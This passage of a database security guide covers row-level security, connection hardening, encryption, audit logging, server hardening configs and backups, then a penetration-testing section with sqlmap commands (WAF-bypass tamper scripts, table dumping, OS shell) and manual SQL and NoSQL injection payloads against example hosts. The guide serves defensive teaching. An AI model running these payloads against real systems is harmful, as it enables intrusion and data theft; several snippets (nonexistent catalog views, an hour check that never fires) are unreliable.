  USING (current_setting('app.role') = 'admin');

-- Forced bypass-protected RLS: default-deny
ALTER TABLE orders FORCE ROW LEVEL SECURITY;
-- Even table owner is subject to RLS!

-- ✅ SAFE — Combined policy with hierarchy
CREATE POLICY order_access ON orders AS PERMISSIVE
  USING (
    user_id = current_setting('app.user_id')::UUID
    OR current_setting('app.role') IN ('admin', 'manager')
    OR EXISTS (
      SELECT 1 FROM team_members
      WHERE team_id = orders.team_id
        AND user_id = current_setting('app.user_id')::UUID
    )
  );
```

### 5.5 Testing RLS Policies

```sql
-- Test as different roles
-- As app_api role:
SET ROLE app_api;
SET app.user_id = '550e8400-e29b-41d4-a716-446655440000';
SET app.role = 'user';

SELECT * FROM orders;
-- Should only return orders belonging to user_id

SET app.role = 'admin';
SELECT * FROM orders;
-- Should return all orders

-- Test bypass prevention
SET app.user_id = '00000000-0000-0000-0000-000000000000';
SELECT * FROM orders;
-- Should return empty set (no matching user_id)

-- Test policy edge cases
SET app.user_id = NULL;
SELECT * FROM orders;
-- Should return empty (NULL != any UUID)
```

### 5.6 Revoking PUBLIC Access

```sql
-- CHECK CURRENT STATE
SELECT nspname, rolname, privilege_type
FROM pg_namespace
JOIN pg_auth_role ON pg_auth_role.rolname = 'public'
LEFT JOIN information_schema.role_table_grants
  ON table_schema = nspname
WHERE nspname NOT LIKE 'pg_%' AND nspname != 'information_schema';

-- ❌ SECURITY GAP: PUBLIC often has default access
SELECT has_schema_privilege('public', 'public', 'USAGE');
-- If true → anyone who can connect to DB can access all tables

-- ✅ SAFE — Revoke PUBLIC access
REVOKE ALL ON DATABASE prod FROM PUBLIC;
REVOKE ALL ON SCHEMA public FROM PUBLIC;
REVOKE ALL ON ALL TABLES IN SCHEMA public FROM PUBLIC;
REVOKE ALL ON ALL SEQUENCES IN SCHEMA public FROM PUBLIC;
REVOKE ALL ON ALL FUNCTIONS IN SCHEMA public FROM PUBLIC;

-- Then re-grant only what's needed:
GRANT CONNECT ON DATABASE prod TO db_readonly;
GRANT USAGE ON SCHEMA public TO db_readonly;
```

### 5.7 `pg_hba.conf` Hardening

```
# ❌ UNSAFE — Trust-based connection (anyone can connect without password)
# TYPE  DATABASE  USER      ADDRESS        METHOD
  local  all       all                       trust
  host   all       all       0.0.0.0/0      trust

# ❌ UNSAFE — Password-based (md5, weak hashing)
# TYPE  DATABASE  USER      ADDRESS        METHOD
  host   all       all       0.0.0.0/0      md5

# ✅ SAFE — Production hardening
# TYPE  DATABASE    USER            ADDRESS            METHOD
  # Local admin socket — only for OS-level DBAs
  local  all         postadmin                           peer

  # Application connections — scram-sha-256 + SSL
  hostssl prod       app_api         10.0.0.0/8         scram-sha-256
  hostssl prod       app_reporting   10.0.0.0/8         scram-sha-256

  # Migration connections — from CI/CD IP only
  hostssl prod       app_migration   10.0.1.0/24        scram-sha-256

  # Admin access — from bastion host only, client cert required
  hostssl all        db_admin        10.0.255.5/32      scram-sha-256 clientcert=1

  # Reject everything else
  host   all         all             0.0.0.0/0          reject
  host   all         all             ::/0               reject
```

### 5.8 Auth Method Decision Tree

```
What auth method to use?
  │
  ├── Local connection (Unix socket)?
  │   ├── Admin/DBA → peer
  │   └── Application → password (scram-sha-256)
  │
  ├── Network connection from trusted subnet?
  │   ├── Application → scram-sha-256 + SSL
  │   └── Admin → scram-sha-256 + SSL + client certificate
  │
  ├── Network connection from external/untrusted?
  │   ├── Always → scram-sha-256 + SSL + client certificate
  │   ├── Plus → VPN/tunnel required (tailscale, wireguard)
  │   └── Plus → MFA (via PAM or proxy)
  │
  └── Replication connection?
      └── scram-sha-256 + client certificate → cert
```

---

## 6. Data Encryption

### 6.1 Encryption Decision Tree

```
                    ┌──────────────────────────────────────────┐
                    │       DATA ENCRYPTION DECISION TREE       │
                    └──────────────────────────────────────────┘

  Is data at rest or in transit?
    │
    ├── IN TRANSIT
    │   └── TLS 1.2+ (minimum)
    │       ├── Mutual TLS for critical systems
    │       └── Certificate pinning for internal services
    │
    └── AT REST
        ├── Disk-level (TDE, LUKS)
        │   → Protects against physical theft
        │   → Does NOT protect from application-level breach
        │
        ├── Database-level (pgcrypto, pg_tde)
        │   → Protects against backup theft
        │   → Transparent to application
        │
        └── Application-level (column encryption)
            → Protects against DBA access
            → Protects against cloud provider access
            → Protects against SQL injection data exfiltration
            → Highest security but limits queryability
```

### 6.2 Transparent Data Encryption (TDE)

```sql
-- PostgreSQL pg_tde (extension)
CREATE EXTENSION IF NOT EXISTS pg_tde;

-- Create encryption key
SELECT pg_tde_add_key_provider_file('file-vault', '/etc/postgresql/tde-key.json');
SELECT pg_tde_set_server_key('db-key', 'file-vault');

-- Create TDE-encrypted tablespace
SELECT pg_tde_create_tablespace('secure_ts', 'file-vault', 'db-key');

-- Create encrypted table
CREATE TABLE credit_cards (
  id UUID PRIMARY KEY,
  card_holder TEXT,
  card_number TEXT,
  expiry DATE,
  cvv_hash TEXT
) TABLESPACE secure_ts;

-- View encryption status
SELECT * FROM pg_tde_principal_key_info();
```

### 6.3 Application-Level Encryption

```typescript
// ❌ UNSAFE — Plaintext sensitive data in DB
await db.query('INSERT INTO users (ssn) VALUES ($1)', [userSSN]);

// ✅ SAFE — Column-level encryption with key management
import { createCipheriv, createDecipheriv, randomBytes } from 'crypto';

const ALGORITHM = 'aes-256-gcm';
const KEY = Buffer.from(process.env.ENCRYPTION_KEY!, 'hex'); // 32 bytes

function encrypt(text: string): { encrypted: string; iv: string; tag: string } {
  const iv = randomBytes(16);
  const cipher = createCipheriv(ALGORITHM, KEY, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  const tag = cipher.getAuthTag().toString('hex');
  return { encrypted, iv: iv.toString('hex'), tag };
}

function decrypt(encrypted: string, iv: string, tag: string): string {
  const decipher = createDecipheriv(ALGORITHM, KEY, Buffer.from(iv, 'hex'));
  decipher.setAuthTag(Buffer.from(tag, 'hex'));
  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

// Insert encrypted data
const { encrypted, iv, tag } = encrypt(userSSN);
await db.query(
  'INSERT INTO users (ssn_encrypted, ssn_iv, ssn_tag) VALUES ($1, $2, $3)',
  [encrypted, iv, tag]
);
```

### 6.4 Searchable Encryption (Blind Indexing)

```typescript
import { createHash, randomBytes } from 'crypto';

// ✅ SAFE — Blind index for exact-match queries on encrypted data
// Allows searching without decrypting every row

function createBlindIndex(value: string, pepper: string): string {
  const normalized = value.toLowerCase().trim();
  const salted = `${normalized}:${pepper}:${process.env.BLIND_INDEX_PEPPER}`;
  return createHash('sha256').update(salted).digest('hex');
}

// Insert with blind index
const ssnBlindIndex = createBlindIndex(userSSN, userId);
await db.query(
  `INSERT INTO users (ssn_encrypted, ssn_iv, ssn_tag, ssn_blind_index)
   VALUES ($1, $2, $3, $4)`,
  [encrypted, iv, tag, ssnBlindIndex]
);

// Query by encrypted field (without decrypting every row)
async function findBySSN(ssn: string): Promise<User | null> {
  // Create blind index for the search
  const searchIndex = createBlindIndex(ssn, '*');  // wildcard for search

  const row = await db.query(
    'SELECT * FROM users WHERE ssn_blind_index = $1',
    [searchIndex]
  );

  if (!row) return null;

  // Verify and decrypt
  const userIndex = createBlindIndex(ssn, row.user_id);
  if (userIndex !== row.ssn_blind_index) return null;  // Hash collision check

  return {
    ...row,
    ssn: decrypt(row.ssn_encrypted, row.ssn_iv, row.ssn_tag)
  };
}
```

### 6.5 Encryption vs Tokenization Decision Tree

```
  Do you need to perform computations on the data?
    │
    ├── YES → Encryption (homomorphic if computation needed on ciphertext)
    │         What kind?
    │         ├── Exact match only → Blind indexing + AES-256-GCM
    │         ├── Range queries → Order-preserving encryption (WEAK security)
    │         └── Full computation → Homomorphic encryption (SLOW, experimental)
    │
    └── NO  → Tokenization (stronger security)
             │
             ├── Do you need the original value back?
             │   ├── YES → Vault-based tokenization (HashiCorp Vault)
             │   └── NO  → Format-preserving tokenization (FPE)
             │
             └── What format?
                 ├── Credit cards → Use PCI-compliant tokenization (Vault, Marqeta)
                 ├── SSN/ID → Format-preserving with vault lookup
                 └── Email → Reversible hash (HMAC with per-user key)
```

### 6.6 In Transit — TLS Cipher Suite Hardening

```ini
# PostgreSQL postgresql.conf — TLS hardening
ssl = on
ssl_ciphers = 'HIGH:!aNULL:!eNULL:!LOW:!MEDIUM:!MD5:!PSK:!DSS:!RC4:!DES:!3DES:!CAMELLIA:!SEED'
ssl_prefer_server_ciphers = on
ssl_min_protocol_version = 'TLSv1.2'
ssl_ecdh_curve = 'prime256v1'

# Modern ciphers only: TLS_AES_256_GCM_SHA384 (TLS 1.3)
# If supporting TLS 1.2: ECDHE-RSA-AES256-GCM-SHA384
# Verify with:
# openssl ciphers -v 'HIGH:!aNULL:!eNULL:...'
```

### 6.7 Key Management — Comparison

| Solution | Rotation | Audit | HSM Support | Cloud-Native | Cost |
|----------|----------|-------|-------------|--------------|------|
| AWS KMS | Auto | Yes | Yes | Yes | $1/key/month + $0.03/10000 ops |
| GCP Cloud KMS | Auto | Yes | Yes | Yes | $0.06/key/month |
| Azure Key Vault | Manual/Auto | Yes | Yes | Yes | $0.03/10000 ops |
| HashiCorp Vault | Auto + Dynamic | Yes | Enterprise only | Self-managed | Open Source (Self) |
| AWS CloudHSM | Manual | Yes | Yes | Yes | $1.40/hour |
| Local (Kubernetes) | Manual | No | No | No | Free |

---

## 7. Audit Logging & Monitoring

### 7.1 PostgreSQL Audit with `pgaudit`

```sql
-- Install pgaudit
-- shared_preload_libraries = 'pgaudit' (in postgresql.conf)

-- Configure pgaudit
CREATE EXTENSION IF NOT EXISTS pgaudit;

-- Audit ALL DDL statements
ALTER SYSTEM SET pgaudit.log = 'write,ddl,role,misc';
-- write = INSERT, UPDATE, DELETE, TRUNCATE
-- ddl = CREATE, DROP, ALTER
-- role = GRANT, REVOKE, CREATE/ALTER/DROP ROLE
-- misc = DISCARD, FETCH, CHECKPOINT, etc.

-- Audit specific tables (fine-grained)
SELECT pgaudit.audit_table('users');
SELECT pgaudit.audit_table('credit_cards', 'read,write');
SELECT pgaudit.audit_table('orders', 'write');

-- Log all statements that take > 1 second
ALTER SYSTEM SET log_min_duration_statement = 1000;

-- Log connections
ALTER SYSTEM SET log_connections = on;
ALTER SYSTEM SET log_disconnections = on;

-- Log all DDL
ALTER SYSTEM SET log_statement = 'ddl';  -- 'none', 'ddl', 'mod', 'all'

-- Reload configuration
SELECT pg_reload_conf();
```

### 7.2 Audit Log Analysis

```sql
-- Query pattern analysis
SELECT
  query,
  calls,
  total_exec_time,
  mean_exec_time,
  rows,
  shared_blks_hit,
  shared_blks_read
FROM pg_stat_statements
WHERE query ILIKE '%SELECT%FROM%users%'
ORDER BY total_exec_time DESC;

-- Failed login attempts
SELECT
  rolname,
  failed_attempts,
  last_failed_attempt
FROM pg_stat_user_roles
WHERE failed_attempts > 0;
```

### 7.3 MySQL Audit

```sql
-- Enable audit log plugin
INSTALL PLUGIN audit_log SONAME 'audit_log.so';
SET GLOBAL audit_log_policy = 'ALL';  -- LOG, ALL, NONE
SET GLOBAL audit_log_format = 'JSON';
SET GLOBAL audit_log_strategy = 'SYNCHRONOUS';

-- Query: Slow query log
SET GLOBAL slow_query_log = ON;
SET GLOBAL long_query_time = 1;  -- seconds
SET GLOBAL log_queries_not_using_indexes = ON;

-- Audit for access to sensitive tables
CREATE EVENT audit_sensitive_access
ON SCHEDULE EVERY 1 HOUR
DO
  INSERT INTO audit_alerts (event_type, detail)
  SELECT 'sensitive_access', CONCAT('Table: ', table_schema, '.', table_name, ' accessed by user')
  FROM information_schema.processlist
  WHERE table_name IN ('credit_cards', 'ssn_records', 'users');
```

### 7.4 Anomaly Detection Rules

```sql
-- Alert: Bulk data export (>10000 rows from sensitive tables)
CREATE OR REPLACE FUNCTION detect_bulk_export()
RETURNS event_trigger AS $$
DECLARE
  row_count int;
BEGIN
  SELECT COUNT(*) INTO row_count
  FROM pg_stat_activity
  WHERE query ILIKE '%SELECT%FROM%users%'
    OR query ILIKE '%SELECT%FROM%credit_cards%';

  IF row_count > 10000 THEN
    INSERT INTO security_alerts (type, detail, severity)
    VALUES (
      'bulk_export',
      format('Bulk data export detected: %s rows from sensitive table', row_count),
      'critical'
    );
  END IF;
END;
$$ LANGUAGE plpgsql;

-- Alert: Unusual login times
CREATE OR REPLACE FUNCTION check_login_time()
RETURNS trigger AS $$
DECLARE
  current_hour int;
BEGIN
  current_hour := EXTRACT(HOUR FROM NOW());
  IF current_hour BETWEEN 22 AND 6 THEN
    INSERT INTO security_alerts (type, detail, severity)
    VALUES (
      'off_hours_access',
      format('Login at %s by user %s from %s', NOW(), NEW.user_name, NEW.client_addr),
      'medium'
    );
  END IF;
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- Alert: Privilege escalation
CREATE OR REPLACE FUNCTION detect_privilege_escalation()
RETURNS event_trigger AS $$
BEGIN
  INSERT INTO security_alerts (type, detail, severity)
  VALUES (
    'privilege_escalation',
    format('GRANT or CREATE ROLE executed by %s', current_user),
    'high'
  );
END;
$$ LANGUAGE plpgsql;
```

### 7.5 SIEM Integration

```yaml
# Filebeat configuration for PostgreSQL audit logs
filebeat.inputs:
- type: log
  paths:
    - /var/log/postgresql/postgresql-*.log
  multiline:
    pattern: '^\d{4}-\d{2}-\d{2}'
    negate: true
    match: after
  fields:
    service: postgresql
    environment: production

processors:
  - dissect:
      tokenizer: "%{timestamp} [%{pid}]: [%{log_level}] %{message}"
      target_prefix: "pg_log"

output.elasticsearch:
  hosts: ["${ELASTICSEARCH_HOST}:9200"]
  index: "postgresql-audit-%{+yyyy.MM.dd}"

# Alert rules (Elasticsearch Watcher / Grafana)
# Rule 1: Multiple failed logins
# expression: rate(pg_stat_database_conflicts{datname="prod"}[5m]) > 5
# action: PagerDuty, Slack, email

# Rule 2: DDL statements
# expression: rate(pg_stat_statements{query=~"CREATE|DROP|ALTER|GRANT|REVOKE"}[5m]) > 0
# action: Slack notification to security team

# Rule 3: Slow queries (potential SQLi)
# expression: pg_log_duration{time > 5000} > 10
# action: Create Jira ticket, send to Slack
```

---

## 8. Database Hardening Checklist

### 8.1 PostgreSQL Hardening

```ini
# postgresql.conf — Security Settings
# ──────────────────────────────────────────────
listen_addresses = 'localhost'           # Not '*' in production
port = 5432
max_connections = 100                    # Limit to prevent resource exhaustion
superuser_reserved_connections = 10      # Ensure superuser can always connect
password_encryption = 'scram-sha-256'    # Not md5
ssl = on
ssl_min_protocol_version = 'TLSv1.2'
ssl_ciphers = 'HIGH:!aNULL:!eNULL:!LOW:!MEDIUM:!MD5:!PSK:!DSS:!RC4:!DES:!3DES:!CAMELLIA:!SEED'
ssl_prefer_server_ciphers = on

# Connection limits per user (set per role)
# ALTER ROLE app_api CONNECTION LIMIT 20;

# Statement timeout (PREVENT QUERY ABUSE)
statement_timeout = '30s'               # Kill queries running > 30 seconds
lock_timeout = '10s'                    # Prevent lock waits
idle_in_transaction_session_timeout = '5min'  # Prevent abandoned txns
idle_session_timeout = '30min'          # Force idle disconnect

# Logging for security
log_connections = on
log_disconnections = on
log_statement = 'ddl'                   # Log all DDL
log_min_duration_statement = 1000       # Log slow queries (>1s)
log_line_prefix = '%t [%p]: [%l-1] user=%u,db=%d,client=%h '
log_error_verbosity = verbose
log_timezone = 'UTC'

# Disable dangerous features
# postgresql.conf
dynamic_library_path = '/usr/lib/postgresql/16/lib'  # Restrict to known path
# ALTER SYSTEM SET jit = off;  # Disable JIT (mitigate JIT-based attacks)
```

### 8.2 MySQL/MariaDB Hardening

```ini
# my.cnf — Security Settings
[mysqld]
# Network
bind-address = 127.0.0.1
skip-networking = 0  # Enable TCP with bind, or set to 1 for socket-only
port = 3306
skip_show_database = ON  # Prevent SHOW DATABASES for non-privileged users

# Authentication
default_authentication_plugin = caching_sha2_password  # Not mysql_native_password
old_passwords = 0

# Encryption
require_secure_transport = ON
ssl-ca = /etc/mysql/ssl/ca.pem
ssl-cert = /etc/mysql/ssl/server-cert.pem
ssl-key = /etc/mysql/ssl/server-key.pem

# File operations
local-infile = 0                    # Disable LOAD DATA LOCAL INFILE
secure-file-priv = /var/lib/mysql-files  # Restrict INTO OUTFILE
skip_symbolic_links = ON            # Prevent symlink attacks

# Logging
general-log = 0                     # General log OFF in production
slow-query-log = 1
slow-query-log-file = /var/log/mysql/slow.log
long_query_time = 2
log-queries-not-using-indexes = ON
log-error = /var/log/mysql/error.log

# Limits
max_connections = 200
max_connect_errors = 10             # Block after 10 failed connections
connect_timeout = 10
wait_timeout = 300                   # Kill idle connections after 5 min
interactive_timeout = 300

# Disable dangerous features
# SET GLOBAL validate_password.policy = STRONG;
# SET GLOBAL validate_password.length = 12;

[client]
default-character-set = utf8mb4
```

### 8.3 MSSQL Hardening

```sql
-- Disable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- Disable CLR integration
EXEC sp_configure 'clr enabled', 0;
RECONFIGURE;

-- Disable cross-db ownership chaining
EXEC sp_configure 'cross db ownership chaining', 0;
RECONFIGURE;

-- Enable contained database authentication
EXEC sp_configure 'contained database authentication', 0;
RECONFIGURE;

-- Set max degree of parallelism (prevent DoS)
EXEC sp_configure 'max degree of parallelism', 4;
RECONFIGURE;

-- Enable audit
USE master;
CREATE SERVER AUDIT SecurityAudit
TO FILE (FILEPATH = '/var/opt/mssql/audit/')
WITH (ON_FAILURE = CONTINUE);
ALTER SERVER AUDIT SecurityAudit WITH (STATE = ON);

-- Surface area configuration
EXEC sp_MSforeachdb 'USE [?]; EXEC sp_changedbowner ''sa''';
EXEC sp_configure 'Agent XPs', 0;
RECONFIGURE;
EXEC sp_configure 'Replication XPs', 0;
RECONFIGURE;
EXEC sp_configure 'SMO and DMO XPs', 0;
RECONFIGURE;
```

### 8.4 MongoDB Hardening

```javascript
// mongod.conf — Security Settings
security:
  authorization: enabled                // Enable RBAC
  javascriptEnabled: false              // Disable server-side JavaScript
  enableEncryption: true
  encryptionKeyFile: /etc/mongodb/encryption-key
  encryptionCipherMode: AES256-CBC

net:
  bindIp: 127.0.0.1                     // Don't expose to internet
  port: 27017
  ssl:
    mode: requireSSL
    PEMKeyFile: /etc/mongodb/server.pem
    CAFile: /etc/mongodb/ca.pem
    disabledProtocols: TLS1_0,TLS1_1

setParameter:
  authenticationMechanisms: SCRAM-SHA-256  // Not MONGODB-CR
  enableLocalhostAuthBypass: 0             // No localhost bypass
  allowDiskUseByDefault: false
```

### 8.5 Redis Hardening

```ini
# redis.conf — Security Settings
# Network
bind 127.0.0.1
protected-mode yes
port 6379
tcp-backlog 511
timeout 300                     # Close idle connections

# Authentication
requirepass your-strong-password-here
# ACL-based access (Redis 6+)
user default off
user app_user on >app-password ~* +@read +@write -@dangerous

# TLS (Redis 6+)
tls-port 6379
tls-cert-file /etc/redis/redis.crt
tls-key-file /etc/redis/redis.key
tls-ca-cert-file /etc/redis/ca.crt
tls-auth-clients yes
tls-protocols "TLSv1.2 TLSv1.3"

# Dangerous command renaming
rename-command FLUSHALL ""           # Disable entirely
rename-command FLUSHDB ""
rename-command KEYS "search:keys"    # Rename to non-obvious
rename-command EVAL "evaluate:script"
rename-command CONFIG "admin:config"

# Limits
maxclients 100
maxmemory 2gb
maxmemory-policy allkeys-lru         # Prevent OOM attacks

# Disable dangerous features
lfu-log-factor 10
lfu-decay-time 1
```

---

## 9. Secure Backups

### 9.1 PostgreSQL Backup Encryption

```bash
# ✅ SAFE — Encrypted backup with pg_dump
pg_dump \
  --dbname=prod \
  --format=custom \
  --compress=9 \
  --file=/tmp/prod_backup.dump \
  --role=app_migration \
  --no-owner \
  --no-privileges

# Encrypt the dump with GPG
gpg --symmetric --cipher-algo AES256 \
  --passphrase-file /etc/backup/gpg-passphrase \
  --output /backup/$(date +%Y%m%d)_prod_backup.gpg \
  /tmp/prod_backup.dump

# Or with openssl
openssl enc -aes-256-cbc -salt \
  -pass file:/etc/backup/encryption-key \
  -in /tmp/prod_backup.dump \
  -out /backup/$(date +%Y%m%d)_prod_backup.enc

# Verify backup integrity
pg_restore --list /backup/20260517_prod_backup.enc | head -20

# ✅ SAFE — Using pgBackRest (recommended for production)
# pgbackrest.conf:
# [prod]
# pg1-path=/var/lib/postgresql/16/main
# repo1-path=/backup/pgbackrest
# repo1-cipher-type=aes-256-cbc
# repo1-cipher-pass=<encryption_password>
# repo1-s3-bucket=prod-db-backups
# repo1-s3-region=us-east-1
# repo1-type=s3
# compress-type=zst
# compress-level=6

# Incremental backup
pgbackrest --stanza=prod --type=incr backup

# Verify backup
pgbackrest --stanza=prod check
```

### 9.2 Backup Storage Security

```hcl
# Terraform — S3 bucket for backups
resource "aws_s3_bucket" "db_backups" {
  bucket = "prod-db-backups-${var.environment}"
}

resource "aws_s3_bucket_versioning" "db_backups" {
  bucket = aws_s3_bucket.db_backups.id
  versioning_configuration {
    status = "Enabled"
  }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "db_backups" {
  bucket = aws_s3_bucket.db_backups.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "aws:kms"
      kms_master_key_id = aws_kms_key.backup_key.arn
    }
  }
}

resource "aws_s3_bucket_public_access_block" "db_backups" {
  bucket = aws_s3_bucket.db_backups.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_lifecycle_configuration" "db_backups" {
  bucket = aws_s3_bucket.db_backups.id
  rule {
    id     = "expire-old-backups"
    status = "Enabled"
    expiration {
      days = 90  // Retention policy
    }
    transition {
      days          = 30
      storage_class = "GLACIER"
    }
  }
}
```

### 9.3 Backup Access Control

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Deny",
      "Action": [
        "s3:DeleteObject",
        "s3:DeleteObjectVersion"
      ],
      "Resource": "arn:aws:s3:::prod-db-backups/*",
      "Condition": {
        "Bool": {
          "aws:SecureTransport": "false"
        }
      }
    },
    {
      "Effect": "Allow",
      "Action": [
        "s3:PutObject",
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::prod-db-backups",
        "arn:aws:s3:::prod-db-backups/*"
      ],
      "Principal": {
        "AWS": "arn:aws:iam::ACCOUNT:role/backup-service"
      }
    }
  ]
}
```

### 9.4 Backup Integrity Verification

```bash
#!/bin/bash
# backup_verify.sh — Verify backup integrity nightly

BACKUP_FILE=$1
EXPECTED_CHECKSUM=$(cat "${BACKUP_FILE}.sha256")
ACTUAL_CHECKSUM=$(sha256sum "$BACKUP_FILE" | cut -d' ' -f1)

if [ "$EXPECTED_CHECKSUM" != "$ACTUAL_CHECKSUM" ]; then
  echo "BACKUP CORRUPTED: $BACKUP_FILE"
  # Alert: PagerDuty, Slack, Email
  curl -X POST -H "Content-Type: application/json" \
    -d '{"text": "Backup integrity check FAILED: '"$BACKUP_FILE"'"}' \
    $SLACK_WEBHOOK_URL
  exit 1
fi

# Test restore
pg_restore --list "$BACKUP_FILE" > /dev/null 2>&1
if [ $? -ne 0 ]; then
  echo "BACKUP RESTORE CHECK FAILED: $BACKUP_FILE"
  exit 1
fi

echo "BACKUP VERIFIED: $BACKUP_FILE"
```

---

## 10. Database Penetration Testing

### 10.1 SQLMap — Advanced Usage

```bash
# Basic SQLi detection
sqlmap -u "https://api.example.com/users?id=1" --batch

# DBMS-specific flag
sqlmap -u "https://api.example.com/users?id=1" --dbms=PostgreSQL --batch

# Authentication + Cookie
sqlmap -u "https://api.example.com/users?id=1" \
  --cookie="session=abc123" \
  --auth-type=Bearer \
  --auth-token="token_here" \
  --level=3

# POST-based injection
sqlmap -u "https://api.example.com/login" \
  --data="username=admin&password=test" \
  --method=POST \
  --batch

# Time-based blind with high delay (firewall evasion)
sqlmap -u "https://api.example.com/users?id=1" \
  --time-sec=10 \
  --retries=1 \
  --random-agent \
  --delay=2

# Tamper scripts — Bypassing WAFs
sqlmap -u "https://api.example.com/users?id=1" \
  --tamper=space2comment,randomcomments,between,unionalltounion,equaltolike \
  --batch

# Available tamper scripts:
# space2comment     → Replaces space with /**
# randomcomments    → Injects random comments
# between           → Replaces > with NOT BETWEEN 0 AND #
# equaltolike       → Replaces = with LIKE
# apostrophemaskenc → Replaces ' with %25%27 (double encoding)
# charunicodeencode → URL encodes characters
# bluecoat          → Bypass Bluecoat WAF
# halfversionedmorekeywords → Bypass ModSecurity

# Full exploitation
sqlmap -u "https://api.example.com/users?id=1" \
  --dbms=PostgreSQL \
  --technique=BEUSTQ \
  --tamper=space2comment \
  --dbs                    # Enumerate databases
  --tables -D prod         # Enumerate tables
  --dump -T users          # Dump table data
  --os-shell               # OS shell (if possible)
  --sql-shell              # SQL shell

# Risk/Level escalation (more thorough but slower)
sqlmap -u "https://api.example.com/users?id=1" \
  --level=5 --risk=3 --batch

# Request file for complex scenarios
# request.txt:
# POST /api/search HTTP/1.1
# Host: api.example.com
# Content-Type: application/json
# 
# {"query": "search*", "limit": 10}

sqlmap -r request.txt --batch
```

### 10.2 Manual SQLi Testing Methodology

```bash
# Step 1: Reconnaissance — DB Fingerprinting
# Check for error messages
curl "https://api.example.com/users?id='"
curl "https://api.example.com/users?id=1'"
curl "https://api.example.com/users?id=1\""

# Check for response differences
curl "https://api.example.com/users?id=1 AND 1=1"
curl "https://api.example.com/users?id=1 AND 1=2"

# PostgreSQL fingerprinting
curl "https://api.example.com/users?id=1 AND '1'::text = '1'"
curl "https://api.example.com/users?id=1 AND (SELECT version() ~ 'PostgreSQL')"

# MySQL fingerprinting
curl "https://api.example.com/users?id=1 AND @@version LIKE '%mysql%'"

# Step 2: Injection Point Discovery
# Test each parameter
curl "https://api.example.com/search?q=test&page=1&limit=10"
# Test: q, page, limit individually with SQLi payloads

# Time-based detection
curl "https://api.example.com/users?id=1 AND pg_sleep(5)"
# Response time > 5s → vulnerable

# Step 3: Column Count
curl "https://api.example.com/users?id=1 ORDER BY 1--"
curl "https://api.example.com/users?id=1 ORDER BY 10--"
# Error at ORDER BY 10 → < 10 columns

# Step 4: Data Extraction
curl "https://api.example.com/users?id=1 UNION SELECT NULL,NULL,NULL--"
# If UNION works, extract:
curl "https://api.example.com/users?id=1 UNION SELECT table_name,NULL,NULL FROM information_schema.tables--"

# Step 5: Privilege Escalation
curl "https://api.example.com/users?id=1 UNION SELECT current_setting('is_superuser'),NULL,NULL--"
```

### 10.3 NoSQLMap (MongoDB Injection Testing)

```bash
# Automated NoSQL injection
nosqlmap --url "https://api.example.com/users?username=admin" --attack

# Blind injection
nosqlmap --url "https://api.example.com/users?username=admin$where" --blind

# Custom injection
nosqlmap --url "https://api.example.com/login" \
  --data '{"username": "admin", "password": {"$ne": ""}}' \
  --http-method POST \
  --json
```

### 10.4 Pentesting Defense Mapping

```
Attacker Step               Defense Layer
───────────────             ─────────────────────────────────────
1. Reconnaissance           → Minimal error details, custom error pages
  (DB fingerprinting)      → Hide PostgreSQL/MySQL version strings
                            → No stack traces in responses

2. Injection Discovery      → Parameterized queries (primary)
  (Finding injection point) → WAF with SQLi rules (secondary)
                            → Input validation (tertiary)

3. Vulnerability            → Least privilege (no DDL for app user)
  Exploitation              → Statement timeout (kill long queries)
                            → Query cancellation
                            → Connection limits

4. Data Extraction          → Column-level encryption
  (UNION SELECT, etc.)      → RLS (can't read other tenants)
                            → Audit logging (detect extraction)
                            → Anomaly detection (bulk export alerts)

5. Privilege Escalation     → Separate admin user (not app user)
                            → Revoked PUBLIC access
                            → No superuser for application

6. Data Exfiltration        → Network isolation (no outbound from DB)
  (OOB, DNS exfil)          → Disable dblink, COPY TO PROGRAM
                            → DNS firewall (block external DNS from DB)
                            → Egress filtering

7. Covering Tracks          → Append-only audit logs
  (Deleting logs)           → Immutable log storage
                            → SIEM with separate log shipping
```

### 10.5 Pentesting Tools Matrix

| Tool | Target | Technique | Detection Difficulty |
|------|--------|-----------|---------------------|
| sqlmap | SQL databases | Automated injection | Low (WAF catchable) |
| NoSQLMap | MongoDB | `$where`, `$ne` injection | Medium |
| jSQL Injection | SQL databases | GUI-based multi-technique | Low |
| BBQSQL | SQL databases | Blind injection focused | Medium |
| Mole | SQL databases | Auto-exploitation | Low |
| OWASP ZAP | Web apps | Active scan with SQLi rules | Medium |
| Burp Suite Pro | Web apps | Intruder + SQLi payloads | High (customizable) |
| SQLNinja | MSSQL | Remote code execution focus | Low |
| PowerUpSQL | MSSQL | AD + SQL Server enumeration | Medium |

---

## 11. ORM & Framework-Specific Security

### 11.1 Prisma

```typescript
// ✅ SAFE — Prisma Client (auto-parameterized)
await prisma.user.findUnique({ where: { id: userId } });
await prisma.user.findMany({ where: { email: { contains: email } } });
await prisma.user.create({ data: { name, email } });

// ⚠️ CAUTION — Raw queries
// ❌ UNSAFE — String interpolation in raw query
await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE id = '${userId}'`);

// ✅ SAFE — Tagged template (auto-parameterized)
await prisma.$queryRaw`SELECT * FROM users WHERE id = ${userId}`;

// ✅ SAFE — $queryRawUnsafe with parameter array
await prisma.$queryRawUnsafe(
  'SELECT * FROM users WHERE id = $1 AND status = $2',
  userId, status
);

// ⚠️ CAUTION — $executeRawUnsafe
// ❌ UNSAFE
await prisma.$executeRawUnsafe(`DELETE FROM users WHERE id = '${userId}'`);

// ✅ SAFE
await prisma.$executeRaw`DELETE FROM users WHERE id = ${userId}`;

// ✅ SAFE — Use Prisma middleware for query validation
prisma.$use(async (params, next) => {
  // Block raw queries that look like injection
  if (params.action === 'queryRaw' || params.action === 'executeRaw') {
    const args = params.args;
    if (args.some((arg: unknown) => typeof arg === 'string' && arg.includes("'"))) {
      throw new Error('Potential SQL injection detected');
    }
  }
  return next(params);
});

// ✅ SAFE — Validate before query
